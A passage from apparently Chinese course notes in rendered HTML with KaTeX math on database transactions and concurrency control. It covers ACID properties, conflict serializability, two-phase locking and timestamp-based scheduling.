id="%EF%BC%881%EF%BC%89%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E4%B8%8D%E4%B8%80%E8%87%B4" tabindex="-1">（1）数据库可能存在不一致</h4><ul><li>三种典型不一致<ul><li>丢失修改</li><li>不能重复读</li><li>脏读</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6%E7%9A%84%E7%BC%98%E7%94%B1" tabindex="-1">（2）并发控制的缘由</h4><pre><code class="language-mermaid">graph LRA(DB共享)--&gt;B(多应用程序使用);B--&gt;C(可能同时使用);C--&gt;D(数据的不一致性);D--&gt;E(不一致性的类型);E--&gt;F(并发控制);F--&gt;G(并发控制方法);</code></pre><h4 id="%EF%BC%883%EF%BC%89%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6%E5%8F%8A%E7%9B%B8%E5%BA%94%E7%9A%84%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E6%8A%80%E6%9C%AF%E6%98%AFdbms%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF" tabindex="-1">（3）并发控制及相应的事务处理技术是DBMS的核心技术</h4><p>核心概念：事务，并发控制，封锁</p><h3 id="2202-%E6%B7%B1%E5%85%A5%E8%AE%A4%E8%AF%86%E4%BA%8B%E5%8A%A1" tabindex="-1">2202 深入认识事务</h3><h4 id="%EF%BC%881%EF%BC%89%E4%BA%8B%E5%8A%A1%E7%9A%84%E6%A6%82%E5%BF%B5" tabindex="-1">（1）事务的概念</h4><ul><li>事务（Transaction）<br>事务是数据库管理系统提供的控制数据操作的一种手段，通过这一手段，应用程序员将一系列的数据库操作组合在一起作为一个整体进行操作和控制，以便数据库管理系统能够提供一致性状态转换的保证。</li></ul><h4 id="%EF%BC%882%EF%BC%89%E4%BA%8B%E5%8A%A1%E7%9A%84%E5%AE%8F%E8%A7%82%E6%80%A7%E5%92%8C%E5%BE%AE%E8%A7%82%E6%80%A7" tabindex="-1">（2）事务的宏观性和微观性</h4><h5 id="%E4%BA%8B%E5%8A%A1%E7%9A%84%E5%AE%8F%E8%A7%82%E6%80%A7%EF%BC%88%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9C%8B%E5%88%B0%E7%9A%84%E4%BA%8B%E5%8A%A1%EF%BC%89" tabindex="-1">事务的宏观性（应用程序员看到的事务）</h5><ul><li>一个存取或改变数据库内容的一次执行，或者说一条或多条SQL语句的一次执行被看作一个事务</li><li>事务一般是由应用程序员提出，因此有开始和结束，结束前需要提交或撤销</li><li>一个事务可以处理一个数据或一条记录</li><li>复杂的事务可以处理一批数据或一批记录</li><li>一段程序语言，可能会循环执行，执行中，由SQL语句引出事务，直到事务结束，每次循环都将产生一个事务</li></ul><h5 id="%E4%BA%8B%E5%8A%A1%E7%9A%84%E5%BE%AE%E8%A7%82%E6%80%A7%EF%BC%88dbms%E7%9C%8B%E5%88%B0%E7%9A%84%E4%BA%8B%E5%8A%A1%EF%BC%89" tabindex="-1">事务的微观性（DBMS看到的事务）</h5><ul><li>对数据库的一系列基本操作（读，写）的一个整体性执行</li><li>事物的并发执行：多个事务在宏观上看是并发执行，但其在微观上的基本操作则可以是交叉执行的</li></ul><h4 id="%EF%BC%883%EF%BC%89%E4%BA%8B%E5%8A%A1%E7%9A%84%E7%89%B9%E6%80%A7" tabindex="-1">（3）事务的特性</h4><ul><li><p>宏观独立性</p></li><li><p>微观交错执行</p></li><li><p>并发控制就是通过事务微观交错执行次序的正确安排，保证事务宏观的独立性，完整性和正确性</p></li><li><p>事务的特性 ACID</p><ul><li>原子性（Atomicity）:DBMS能够保证事务的一组更新操作是原子不可分的，即对DB而言，要么全做，要么不做</li><li>一致性（Consistency）:DBMS保证事务的操作状态是正确的，符合一致性的操作规则，不能出现三种典型的不一致性。它是进一步由隔离性来保证的。</li><li>隔离性（Isolation）:DBMS保证并发执行的多个事务之间互相不受影响。例如两个事务T1，T2，既是并发执行，也相当于依次执行</li><li>持久性（Durablity）:DBMS保证已提交的事务影响是持久的，被撤销事务的影响是可以恢复的</li></ul></li><li><p>具有ACID特性的若干数据库基本操作的组合体称为事务</p></li></ul><h4 id="%EF%BC%884%EF%BC%89dbms%E5%AF%B9%E4%BA%8B%E5%8A%A1%E7%9A%84%E6%8E%A7%E5%88%B6" tabindex="-1">（4）DBMS对事务的控制</h4><img src="/images/本科/DBMS对事务的控制.jpg"><h3 id="2203-%E4%BA%8B%E5%8A%A1%E8%B0%83%E5%BA%A6%E7%9A%84%E5%8F%AF%E4%B8%B2%E8%A1%8C%E6%80%A7" tabindex="-1">2203 事务调度的可串行性</h3><h4 id="%EF%BC%881%EF%BC%89%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5" tabindex="-1">（1）基本概念</h4><ul><li>事务调度：一组事务的基本步（读，写，其它控制操作比如加锁，解锁等）的一种执行顺序称为对这组事务的一个调度。<br>并发调度：多个事务从宏观上看是并发执行的，但是其微观上的基本操作(读写)则是交叉执行的。</li><li>并发调度的正确性：当且仅当在这个并发调度下所得到的新数据库结果与分别串行地运行这些事务所得到地新数据库完全一直，则说调度是正确的。</li><li>可串行性：如果不管数据库初始状态如何，一个调度对数据库状态的影响都和某个串行调度相同，则我们说这个调度是可串行化的或者说可序列化的。</li><li>可串行化调度一定是正确地并行调度，但正确的并行调度，却未必第一事故可串行化的调度</li><li>并行调度的正确性是指内容上的结果正确性，而可串行性是指形式上结果正确性</li><li>可串行化的等效串行序列不一定唯一</li></ul><h4 id="%EF%BC%882%EF%BC%89%E4%B8%80%E7%A7%8D%E7%AE%80%E5%8D%95%E7%9A%84%E4%BA%8B%E5%8A%A1%E8%B0%83%E5%BA%A6%E7%9A%84%E6%A0%87%E8%AE%B0%E6%A8%A1%E5%9E%8B" tabindex="-1">（2）一种简单的事务调度的标记模型</h4><p><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>r</mi><mi>T</mi></msub><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">r_T(A):</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>事务T读A. <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mi>T</mi></msub><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">w_T(A):</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>事务T写A</p><h4 id="%EF%BC%883%EF%BC%89%E5%86%B2%E7%AA%81%E7%9A%84%E4%B8%B2%E8%A1%8C%E6%80%A7" tabindex="-1">（3）冲突的串行性</h4><ul><li>冲突：调度中的一对连续的动作，他们满足：如果它们的顺序交换，那么涉及的事务中至少有一个事务的行为会改变</li><li>有冲突的两个操作是不能交换次序的，没有冲突的两个事务是可交换的</li><li>几种冲突情况<ul><li>同一事务的任何两个操作都是冲突的</li><li>不同事务对同一元素的两个写操作是冲突的</li><li>不同事务对同意元素的一读一写操作是冲突的</li></ul></li><li>冲突可串行性：一个调度，如果通过交换两个相邻的无冲突的操作能够转换到某一个串行的调度，则称此调度为冲突可串行化的调度。</li><li>冲突可串行化是比 可串行化更严格的概念</li><li>满足冲突可串行化，一定满足可串行性</li></ul><h4 id="%EF%BC%884%EF%BC%89%E5%86%B2%E7%AA%81%E5%8F%AF%E4%B8%B2%E8%A1%8C%E6%80%A7%E5%88%A4%E5%88%AB%E7%AE%97%E6%B3%95" tabindex="-1">（4）冲突可串行性判别算法</h4><h5 id="%EF%BC%881%EF%BC%89%E9%97%AE%E9%A2%98" tabindex="-1">（1）问题</h5><ul><li><p>并发调度的正确性：当且仅当在这个并发调度下所得到的新数据库结果与分别串行地运行这些事务所得到的新数据库完全一致，则说调度是正确的</p></li><li><p>问题1：怎样判断一个并发调度是正确的</p><ul><li>解决：通过判断是否为冲突可串行性</li></ul></li><li><p>问题2：怎样产生一个正确的并发调度</p></li></ul><h5 id="%EF%BC%882%EF%BC%89%E7%AE%97%E6%B3%95%E8%A1%A8%E8%BE%BE" tabindex="-1">（2）算法表达</h5><ul><li>构造一个前驱图（有向图）</li><li>节点是每一个事务<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">T_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>，如果<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">T_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>的一个操作与<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">T_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq>的一个操作发生冲突，且<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">T_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>在<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">T_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq>前执行，则绘制一条边，由<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">T_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>指向<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">T_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq>，表示<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">T_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>要在前<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">T_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq>执行</li><li>测试检查：如果该有向图没有环，则是冲突可串行化的</li></ul><h3 id="2204-%E5%9F%BA%E4%BA%8E%E5%B0%81%E9%94%81%E7%9A%84%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6%E6%96%B9%E6%B3%95" tabindex="-1">2204 基于封锁的并发控制方法</h3><h4 id="%EF%BC%881%EF%BC%89-%E9%97%AE%E9%A2%98" tabindex="-1">（1） 问题</h4><ul><li>怎样产生一个冲突可串行化的调度<ul><li>基于封锁的并发控制</li><li>基于时间戳的并发控制</li><li>基于有效性确认的并发控制</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E4%BB%80%E4%B9%88%E6%98%AF%E2%80%9C%E9%94%81%E2%80%9D" tabindex="-1">（2）什么是“锁”</h4><ul><li>“锁”是控制并发的一种手段<ul><li>每一数据元素都有一个唯一的锁</li><li>每一事务读写数据元素前，要获取锁</li><li>如果被其他食物持有该元素的锁，则要等待</li><li>事务处理完成后要释放锁</li></ul></li></ul><p><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">L_i(A):</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>事务<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">T_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>对数据元素<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span></eq>加锁<br><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>U</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">U_i(A):</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>事务<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">T_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>对数据元素<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span></eq>解锁</p><ul><li>事务调度器   拥有锁表，来管理锁<ul><li>利用锁来保证冲突的可串行性</li><li>对所有事务的操作产生一个读写操作序列</li><li>保证事务的一致性</li></ul></li><li>锁本身并不能保证冲突可串行性</li><li>锁为调度提供了控制的手段，但如何用锁，仍需说明，并采用不同的协议</li></ul><h4 id="%EF%BC%883%EF%BC%89%E5%B0%81%E9%94%81%E5%8D%8F%E8%AE%AE%E9%9C%80%E8%A6%81%E8%80%83%E8%99%91%E4%BB%80%E4%B9%88" tabindex="-1">（3）封锁协议需要考虑什么</h4><ul><li>封锁协议之锁的类型<ul><li>排他锁（又称X锁）<ul><li>只有一个事务能读，写，其它任何事物不能读写</li></ul></li><li>贡献锁<ul><li>所有事务都可以读，但任何事务都不能写</li></ul></li><li>更新锁<ul><li>初始读，以后可升级为写</li></ul></li><li>增量锁<ul><li>增量更新</li><li>区分增量更新和其他类型的更新</li></ul></li></ul></li><li>封锁协议之相容性矩阵<ul><li>当某事务对一数据对象持有一种锁时，另一事务再申请对该对象加某一类型锁时，时允许还是不允许</li></ul></li><li>封锁协议之解锁和加锁的时机<ul><li>SQL之隔离性级别</li><li>读未提交</li><li>读已提交</li><li>可重复读</li><li>可串行化</li></ul></li><li>封锁协议之封锁力度<ul><li>封锁力度指封锁数据对象的大小</li><li>粒度单位：属性值-元组-元组集合-整个关系-整个DB某索引项-某个索引</li><li>从前往后：并发度变小，封锁开销小，从后往前相反</li></ul></li></ul><h4 id="%EF%BC%884%EF%BC%89%E4%B8%A4%E7%AB%AF%E5%B0%81%E9%94%81%E5%8D%8F%E8%AE%AE" tabindex="-1">（4）两端封锁协议</h4><h5 id="%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%A4%E6%AE%B5%E5%B0%81%E9%94%81%E5%8D%8F%E8%AE%AE" tabindex="-1">什么是两段封锁协议</h5><ul><li><p>读写数据之前要获得锁。每个事务中所有封锁请求先于任何一个解锁请求</p></li><li><p>两阶段：加锁段，解锁段。加锁段中不能有解锁操作，解锁段中不能有加锁操作。</p></li><li><p>两段封锁协议可以保证冲突可串行化<br>归纳法证明P215</p></li><li><p>两端封锁协议可能产生死锁</p></li></ul><h3 id="2205-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E6%88%B3%E7%9A%84%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6" tabindex="-1">2205 基于时间戳的并发控制</h3><h4 id="%EF%BC%881%EF%BC%89%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%B6%E9%97%B4%E6%88%B3" tabindex="-1">（1）什么是时间戳</h4><ul><li><p>一种基于时间的标志</p></li><li><p>时间戳具有唯一性和递增性</p></li><li><p>事务T启动时，系统将该时刻赋予T，为T的时间戳</p></li><li><p>时间戳可以表征一系列事务执行的先后顺序：时间戳小的事务先执行，大的后执行</p></li><li><p>利用时间戳，可以不用锁来进行并发控制</p></li></ul><h4 id="%EF%BC%882%EF%BC%89%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E6%88%B3%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF" tabindex="-1">（2）基于时间戳并发控制的基本思路</h4><ul><li>借助时间戳，强制使一组并发事务的交叉执行，等价于一个特定顺序（时间戳从小到大）的串行执行</li><li>如何强制：执行判断冲突<ul><li>如无冲突，予以执行</li><li>如有冲突，则撤销事务，并重启该事务<br>此时该事务获得了一个更大的时间戳，表明是后执行的事务</li></ul></li><li>有哪些冲突<ul><li>读读无冲突</li><li>读写或写读冲突</li><li>写写冲突</li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E6%88%B3%E7%9A%84%E7%AE%80%E5%8D%95%E8%B0%83%E5%BA%A6" tabindex="-1">（3）基于时间戳的简单调度</h4><p>对DB中的每个元素x，系统保留其上最大的时间戳</p><ul><li><p>RT（X）即R-timestamp（x）</p><ul><li>读过该数据事务中最大的时间戳，即最后读x的事务的时间戳</li></ul></li><li><p>WT（X）即W-timestamp（x）</p><ul><li>写过该数据事务中最大的时间戳，即最后写x的事务的时间戳</li></ul></li><li><p>事务的时间戳</p><ul><li>TS（T）：即TimeStamp</li></ul></li><li><p>读写并发：</p><ul><li>若T事务读x，则将T的时间戳TS与WT（x）比较：<ul><li>若TS大（T 后进行），则允许T操作，并且更改RT（x）为max(RT(x),TS)</li><li>否则，有冲突，撤回T，重启T</li></ul></li><li>若T事务写x，则将T的时间戳TS与RT（x）比较<ul><li>若TS大（T后进行），则允许T操作，并且更改WT（x）为max(WT(x),TS)</li></ul></li></ul></li><li><p>写写并发</p><ul><li>若T事务写x，则将T的时间戳TS与WT（x）比较<ul><li>若TS大，则允许T写，并且更改WT（x）为T的时间戳</li><li>否则有冲突，T撤回重做</li></ul></li></ul></li></ul><h4 id="%EF%BC%884%EF%BC%89%EF%BC%883%EF%BC%89%E7%9A%84%E6%94%B9%E8%BF%9B" tabindex="-1">（4）（3）的改进</h4><p>新增标志：</p><ul><li>C（x）：x的提交位<ul><li>该位为真，当且仅当最近写x的事务已经提交</li><li>C（x）的目的是避免出现事务读另一事务U所写数据然后U还未写完终止这样的情况</li></ul></li><li>对来自事务T的读写请求，调度器可以<ul><li>同意请求</li><li>撤销或终止T，并重启具有新时间戳的T(终止+重启，称为回滚)</li><li>推迟T，并在以后决定是终止T还是同意请求(如果请求是读，且此读可能是脏的)</li></ul></li></ul><h5 id="%E8%B0%83%E5%BA%A6%E8%A7%84%E5%88%99" tabindex="-1">调度规则</h5><ul><li>假设调度器收到请求<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>r</mi><mi>T</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">r_T(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 